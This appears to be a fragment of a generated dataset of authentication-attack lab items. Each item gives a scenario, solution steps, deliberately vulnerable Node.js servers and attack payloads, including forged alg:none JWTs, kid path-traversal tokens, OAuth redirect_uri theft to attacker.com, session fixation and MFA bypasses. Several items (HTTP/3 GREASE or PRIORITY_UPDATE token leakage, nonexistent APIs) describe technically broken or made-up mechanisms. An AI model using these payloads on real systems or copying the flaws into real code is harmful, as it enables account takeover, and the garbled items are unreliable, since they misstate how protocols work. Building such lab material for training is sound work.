    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  const session = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || \n                 Math.random().toString(36).substr(2);\n  \n  if (protocol === 'secure-v1') {\n    sessions[session] = { authenticated: true };\n  } else if (protocol === 'insecure-v1' && sessions[session]) {\n    ws.send('Session maintained: ' + session);\n  }\n  \n  ws.on('message', (message) => {\n    if (sessions[session]?.authenticated) {\n      ws.send('Privileged action executed');\n    }\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: secure-v1\nCookie: session=fixated-session-123",
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: insecure-v1\nCookie: session=fixated-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport stream multiplexing",
    "Lab Scenario": "The lab's MFA verification is vulnerable to bypass through WebTransport stream multiplexing. The application fails to properly isolate MFA verification streams from authenticated command streams. To solve: initiate MFA verification in one stream while sending privileged commands in another parallel stream.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Create separate bidirectional streams for MFA and commands",
      "Initiate MFA verification in primary stream",
      "Send privileged commands in parallel secondary stream",
      "Exploit race condition in stream isolation logic"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa');\nwt.ready.then(() => {\n  const mfaStream = wt.createBidirectionalStream();\n  const cmdStream = wt.createBidirectionalStream();\n  \n  const mfaWriter = mfaStream.writable.getWriter();\n  mfaWriter.write('START_MFA');\n  \n  const cmdWriter = cmdStream.writable.getWriter();\n  cmdWriter.write('PRIVILEGED_CMD');\n  \n  cmdStream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      console.log('Command response:', chunk.toString());\n    }\n  }));\n});",
    "payloads": [
      "stream 1: START_MFA\nstream 2: ADMIN_CMD",
      "stream 1: VERIFY_CODE_123456\nstream 2: GET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via HTTP/3 connection coalescing",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm confusion when HTTP/3 connections coalesce. The application fails to properly isolate cryptographic contexts when multiple hosts share an IP address. To solve: craft a JWT that appears as RS256 when validated by Host A but becomes HS256 when processed by Host B on the same IP.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify shared IP hosting using DNS and HTTP/3 server push",
      "Forge JWT with header that changes meaning between hosts",
      "Exploit connection coalescing to deliver different validation contexts",
      "Bypass signature validation through algorithm confusion",
      "Verify admin access through crafted token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  maxConnectionsPerHost: 2\n});\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let token = '';\n    stream.on('data', (chunk) => {\n      const match = chunk.toString().match(/Bearer (\\S+)/);\n      if (match) token = match[1];\n    });\n    stream.on('end', () => {\n      try {\n        const decoded = jwt.verify(token, 'publicKey.pem', { algorithms: ['RS256', 'HS256'] });\n        if (decoded.admin) stream.end('Admin access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-host-a.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature",
      "GET /admin HTTP/3\nHost: vulnerable-host-b.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/2 PRIORITY_UPDATE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/2 PRIORITY_UPDATE frame metadata. The application includes sensitive tokens in stream priority weight calculations. To solve: manipulate stream dependencies to force token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft requests with malicious stream dependencies",
      "Force server to include tokens in PRIORITY_UPDATE frames",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst server = http2.createSecureServer({\n  key: 'key.pem',\n  cert: 'cert.pem'\n});\nserver.on('stream', (stream, headers) => {\n  if (headers[':path'] === '/oauth/token') {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    stream.respond({ ':status': 200 });\n    stream.end(JSON.stringify({ access_token: token }));\n    stream.priority({ weight: token.length });\n  }\n});\nserver.listen(443);",
    "payloads": [
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
      "GET /oauth/token HTTP/2\nHost: vulnerable-app.com\nConnection: dependency=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport DATAGRAM context switching",
    "Lab Scenario": "The lab's session management is vulnerable to fixation through WebTransport DATAGRAM context switching. The application associates sessions with DATAGRAM flow IDs but fails to clear them on reconnection. To solve: establish DATAGRAM flow, reconnect with same flow ID, and fixate privileged session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with DATAGRAM flow",
      "Authenticate and obtain privileged session",
      "Disconnect while maintaining flow ID state",
      "Reconnect with same flow ID to resume privileged session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/session');\nconst sessions = {};\nwt.ready.then(() => {\n  const datagramWriter = wt.datagrams.writable.getWriter();\n  datagramWriter.write('INIT_SESSION');\n  \n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const [flowId, session] = value.toString().split(':');\n      sessions[flowId] = session;\n    }\n  }));\n  \n  wt.closed.then(() => {\n    setTimeout(() => {\n      const newWt = new WebTransport('https://localhost:4433/session', {\n        flowId: wt.flowId\n      });\n      newWt.ready.then(() => {\n        newWt.datagrams.writable.getWriter().write('PRIVILEGED_CMD');\n      });\n    }, 1000);\n  });\n});",
    "payloads": [
      "flowId: fixed-flow-123\nINIT_SESSION",
      "flowId: fixed-flow-123\nADMIN_CMD"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP Trailers in gRPC streaming",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC streaming trailer manipulation. The application processes MFA verification status in trailers but fails to validate them against the stream body. To solve: send valid MFA code in stream messages but override verification status in trailers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept gRPC streaming connection",
      "Send valid MFA code in message body",
      "Inject malicious verification status in trailers",
      "Exploit timing difference between body and trailer processing",
      "Bypass MFA requirement while appearing compliant"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call) {\n    let codeValid = false;\n    call.on('data', (message) => {\n      if (message.code === '123456') codeValid = true;\n    });\n    call.on('end', () => {\n      call.sendTrailers({\n        'mfa-verified': call.metadata.get('trailer-override')[0] || codeValid.toString()\n      });\n    });\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "message: { code: '123456' }\ntrailers: { 'trailer-override': 'true' }",
      "message: { code: '111111' }\ntrailers: { 'mfa-verified': 'true' }"
    ]
  },
  {
    "Lab scenario": "JWT validation bypass via HTTP/2 CONTINUATION frame injection",
    "Lab Description": "The lab's JWT validation is vulnerable to header splitting through HTTP/2 CONTINUATION frames. The application fails to properly reconstruct headers split across multiple CONTINUATION frames, allowing JWT claims to be smuggled. To solve: craft a request with malicious JWT claims in CONTINUATION frames that override the original token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to split Authorization header across CONTINUATION frames",
      "Inject malicious claims in subsequent CONTINUATION frames",
      "Bypass signature validation through header reconstruction flaws",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n});\nserver.on('stream', (stream, headers) => {\n  let fullAuthHeader = headers[':authorization'] || '';\n  stream.on('continuation', (headers) => {\n    fullAuthHeader += headers[':authorization'] || '';\n  });\n  stream.on('end', () => {\n    const token = fullAuthHeader.split('Bearer ')[1];\n    const decoded = jwt.verify(token, 'secret');\n    if (decoded.admin) {\n      stream.respond({ ':status': 200 });\n      stream.end('Admin access granted');\n    }\n  });\n});\nserver.listen(443);",
    "payloads": [
      "HEADERS frame:\n:method: GET\n:path: /admin\n:authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nCONTINUATION frame:\n:authorization: .eyJ1c2VyIjoiZ3Vlc3QifQ.Signature\n\nMALICIOUS CONTINUATION frame:\n:authorization: .eyJhZG1pbiI6dHJ1ZX0.Override",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 GREASE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/3 GREASE frame metadata. The application includes sensitive tokens in reserved frame type processing. To solve: craft GREASE frames that trigger token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using QUIC-aware proxy",
      "Inject custom GREASE frames with token extraction payloads",
      "Force server to include tokens in unknown frame processing",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  grease: true\n});\nquicSocket.on('session', (session) => {\n  session.on('grease', (frame) => {\n    if (frame.type === 0x1a1a) {\n      const token = frame.data.toString().match(/token=([^&]+)/)[1];\n      console.log('Extracted token:', token);\n    }\n  });\n});",
    "payloads": [
      "GREASE frame type: 0x1a1a\nPayload: token=leaked_oauth_token_123",
      "GET /oauth HTTP/3\nHost: vulnerable-app.com\nCustom-Grease: 1"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport stream priority inversion",
    "Lab Description": "The lab's session management is vulnerable to fixation through WebTransport stream priority manipulation. The application associates sessions with stream priorities but fails to validate them on stream recreation. To solve: create high-priority stream, fixate session, then recreate stream with same priority to resume session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with high-priority stream",
      "Authenticate and obtain privileged session",
      "Disconnect while noting stream priority",
      "Reconnect with same stream priority to resume session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/stream-priority');\nconst sessions = {};\nwt.ready.then(() => {\n  const stream = wt.createBidirectionalStream({ priority: 255 });\n  const writer = stream.writable.getWriter();\n  writer.write('AUTH_ADMIN');\n  \n  stream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      sessions[stream.priority] = chunk.toString();\n    }\n  }));\n  \n  setTimeout(() => {\n    const newStream = wt.createBidirectionalStream({ priority: 255 });\n    newStream.writable.getWriter().write('PRIVILEGED_CMD');\n  }, 1000);\n});",
    "payloads": [
      "stream priority: 255\nAUTH_ADMIN",
      "stream priority: 255\nGET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "MFA bypass via gRPC metadata compression oracle",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC metadata compression analysis. The application leaks verification status through compression ratios of error messages. To solve: analyze compression differences between valid and invalid MFA codes to derive correct code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept gRPC traffic with compression enabled",
      "Send brute-force MFA codes and measure response sizes",
      "Identify compression ratio differences for valid codes",
      "Derive correct MFA code through statistical analysis",
      "Bypass MFA with derived code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call, callback) {\n    const code = call.request.code;\n    if (code === '654321') {\n      callback(null, { verified: true });\n    } else {\n      const error = new Error(`Invalid code ${code}. Please try again with a 6-digit code.`);\n      error.code = grpc.status.INVALID_ARGUMENT;\n      callback(error);\n    }\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "{\"code\":\"111111\"}",
      "{\"code\":\"222222\"}\n{\"code\":\"333333\"}\n{\"code\":\"444444\"}\n{\"code\":\"555555\"}\n{\"code\":\"666666\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to properly validate the algorithm. The vulnerable endpoint /api/admin accepts unsigned tokens when alg:none is specified. To solve: Forge an administrative JWT without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode it in the JWT Editor extension",
      "Modify the algorithm header to 'none' and change the role to 'admin' in the payload",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Send the modified token to /api/admin endpoint using Postman",
      "Verify access to admin panel at /api/admin/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/api/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.json({access: 'granted'});\n    }\n  }\n  res.status(403).json({error: 'Forbidden'});\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The single-page application implements OAuth 2.0 with implicit flow but exposes access tokens in browser history due to improper callback handling. The application stores OAuth tokens in URL fragments. To solve: Retrieve victim's access token from browser history and access their profile data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token leakage points",
      "Craft malicious page that forces victim to initiate OAuth flow",
      "Exploit history.pushState to capture token from redirect URL",
      "Extract access_token parameter from simulated browser history",
      "Use stolen token in API requests to /user/profile endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.access_token;\n  res.redirect(`/welcome#token=${token}`);\n});\n\napp.get('/user/profile', (req, res) => {\n  const token = req.headers.authorization;\n  if (token === 'Bearer stolen_token') {\n    return res.json({email: 'victim@example.com'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>history.replaceState({},'','/malicious#access_token=stolen_token')</script>",
      "http://victim.com/oauth/callback?access_token=stolen_token"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation",
    "Lab Description": "The GraphQL API allows session fixation by accepting arbitrary session identifiers through the createSession mutation. The application doesn't regenerate session IDs after authentication. To solve: Fixate a session ID and trick the victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send introspection query to discover available mutations",
      "Use createSession mutation to generate predictable session ID",
      "Force victim browser to use this session via XSS or link injection",
      "Wait for victim to authenticate with fixated session",
      "Access victim account using the known session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Mutation {\n    createSession(id: String): Session\n  }\n  type Session {\n    id: String\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    createSession: (_, { id }) => {\n      return { id: id || Math.random().toString(36).substr(2, 9) };\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers });",
    "payloads": [
      "mutation { createSession(id: \"fixed123\") { id } }",
      "POST /graphql {\"query\":\"mutation($id:String!){createSession(id:$id){id}}\",\"variables\":{\"id\":\"attacker_controlled\"}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in SOAP service",
    "Lab Description": "The SOAP-based authentication service implements MFA but fails to validate the state parameter between steps. The application trusts client-provided state values after MFA verification. To solve: Bypass MFA by manipulating state parameters in the authentication flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial SOAP auth request using Burp Suite",
      "Note the state parameter in the MFA initiation response",
      "Intercept MFA verification request and modify state to match first step",
      "Replay modified request before token expiration",
      "Access protected resource with obtained session token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet states = {};\n\napp.post('/soap/auth', (req, res) => {\n  const state = Math.random().toString(36).substr(2, 12);\n  states[state] = { verified: false };\n  res.type('application/xml');\n  res.send(`<AuthResponse><State>${state}</State></AuthResponse>`);\n});\n\napp.post('/soap/verify', (req, res) => {\n  const state = req.body.match(/<State>(.*?)<\\/State>/)[1];\n  states[state].verified = true;\n  res.type('application/xml');\n  res.send(`<VerifyResponse><Token>valid_token</Token></VerifyResponse>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><State>attacker_controlled</State><Code>123456</Code></Verify></Body></Envelope>",
      "<Envelope><Body><Auth><Username>admin</Username></Auth></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The microservice architecture uses JWT with kid header pointing to local files for key verification. The application fails to sanitize kid header values, allowing path traversal. To solve: Forge admin JWT by loading arbitrary local files as verification keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze kid header in JWT Editor",
      "Modify kid header to point to /dev/null or known static files (like /etc/passwd)",
      "Craft new token with alg:HS256 and kid:/var/www/keys/static_key.pub",
      "Sign token with simple key (like 'secret') and verify error responses",
      "Access /admin/api endpoint with forged token to retrieve flag"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin/api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  try {\n    const key = fs.readFileSync(decoded.header.kid);\n    jwt.verify(token, key);\n    res.json({flag: process.env.FLAG});\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.dBj6Je1Z3X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIvd3d3L2tleXMvc3RhdGljX2tleS5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.1HtH7lJZ4X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state validation",
    "Lab Description": "The OAuth implementation in the React frontend fails to properly validate state parameters during callback. The application trusts client-side state verification, allowing token swapping. To solve: Intercept OAuth flow and replace victim's auth code with your own while maintaining valid state.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP while intercepting requests",
      "Capture state parameter and authorization code from callback URL",
      "Modify state parameter in Postman to match victim's session",
      "Swap authorization code while preserving modified state",
      "Exchange stolen code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet oauthStates = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  if (oauthStates[state]) {\n    res.cookie('auth', code);\n    res.redirect('/profile');\n  } else {\n    res.status(400).send('Invalid state');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "http://target.com/oauth/callback?code=STOLEN_CODE&state=ATTACKER_STATE",
      "POST /oauth/token {\"code\":\"victim_code\"}"
    ]
  },
  {
    "Lab scenario": "Session token leakage via GraphQL verbose errors",
    "Lab Description": "The GraphQL endpoint leaks session tokens through verbose error messages when malformed queries are submitted. The application's debug mode remains enabled in production. To solve: Extract valid session tokens from error responses and hijack user sessions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send malformed GraphQL queries using Postman to trigger errors",
      "Analyze error responses for leaked session information",
      "Identify pattern in session token generation",
      "Extract valid tokens from error stack traces",
      "Use stolen tokens in Authorization header to access /userProfile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Query {\n    getUser: User\n  }\n  type User {\n    id: ID\n    name: String\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    getUser: (_, __, context) => {\n      if (!context.session) throw new Error('Invalid session: '+context.sessionToken);\n      return { id: 1, name: 'Admin' };\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  debug: true,\n  formatError: (err) => {\n    return { message: err.message, stack: err.stack };\n  }\n});",
    "payloads": [
      "query { invalidField }\n# Returns error with session token",
      "mutation { __typename }"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in REST API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition where the first valid code disables verification for subsequent requests. The application fails to implement proper transaction locking. To solve: Send parallel requests with valid and invalid codes to bypass MFA protection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture MFA verification request in Burp Suite",
      "Send multiple parallel requests using Turbo Intruder",
      "Mix valid and invalid codes in payloads",
      "Identify successful bypass when one valid code authenticates all requests",
      "Access restricted /transfer endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  if (mfaCodes[user] === code) {\n    delete mfaCodes[user];\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.post('/transfer', (req, res) => {\n  if (!req.headers.authorization) {\n    res.status(401).send('Unauthorized');\n  } else {\n    res.send('Transfer complete');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa [{\"user\":\"victim\",\"code\":\"123456\"},{\"user\":\"victim\",\"code\":\"111111\"}]",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"INVALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via header injection in REST API",
    "Lab Description": "The API endpoint /admin/panel uses JWT authentication but fails to validate signature when custom headers are injected. The application processes unsigned tokens if x-algorithm header is present. To solve: Gain admin access by stripping JWT signature while maintaining valid payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-algorithm: none header",
      "Remove JWT signature section (content after second dot) while keeping header and payload",
      "Modify payload role to 'admin' and send to /admin/panel endpoint",
      "Verify successful bypass by checking HTTP 200 response",
      "Access restricted admin functions at /admin/panel/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin/panel', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  if (req.headers['x-algorithm']) {\n    options.algorithms = [req.headers['x-algorithm']];\n  }\n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.ignored_signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters, allowing tokens to be leaked to attacker-controlled domains. The application doesn't verify exact match of registered callback URLs. To solve: Steal authorization code by modifying redirect_uri to point to malicious server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP and intercept authorization request",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Let victim complete authentication flow",
      "Capture authorization code in attacker server logs",
      "Exchange code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://*.example.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const client = clients[client_id];\n  \n  if (client && redirect_uri.includes('example.com')) {\n    const code = 'random_code';\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid request');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com/callback",
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://subdomain.attacker.example.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint over websockets accepts arbitrary session IDs during connection initialization. The application doesn't regenerate session IDs after authentication. To solve: Fixate session ID through websocket connection and hijack authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish websocket connection to /graphql with custom session_id parameter",
      "Capture connection initialization frame in Burp Suite",
      "Modify session_id to predictable value and reconnect",
      "Trick victim into authenticating with fixated session ID",
      "Access privileged data through subscription queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Subscription {\n    secretData: String\n  }\n`;\n\nconst resolvers = {\n  Subscription: {\n    secretData: {\n      subscribe: (_, __, { sessionId }) => {\n        if (authenticatedSessions[sessionId]) {\n          return pubSub.asyncIterator('SECRET_DATA');\n        }\n      }\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  subscriptions: {\n    onConnect: (params) => {\n      return { sessionId: params.sessionId || generateRandomId() };\n    }\n  }\n});",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"attacker_controlled\"}}",
      "{\"query\":\"subscription { secretData }\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited code reuse",
    "Lab Description": "The MFA implementation allows previously used codes to remain valid for short time windows after being consumed. The application fails to immediately invalidate used codes. To solve: Intercept valid MFA code and reuse it within the allowed time frame.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid MFA submission in Burp Suite",
      "Note timestamp of successful verification",
      "Resend same code within 30 second window",
      "Verify successful authentication with reused code",
      "Access protected /account endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst activeCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (activeCodes[user] === code) {\n    setTimeout(() => delete activeCodes[user], 30000);\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({secret: 'STOLEN_DATA'});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"PREVIOUSLY_USED_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via exposed public key in REST API",
    "Lab Description": "The API exposes its public key at /jwks.json endpoint but fails to properly validate JWT algorithm. The application accepts RS256-signed tokens when configured for HS256. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin claims in Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin endpoint to gain access"
    ],
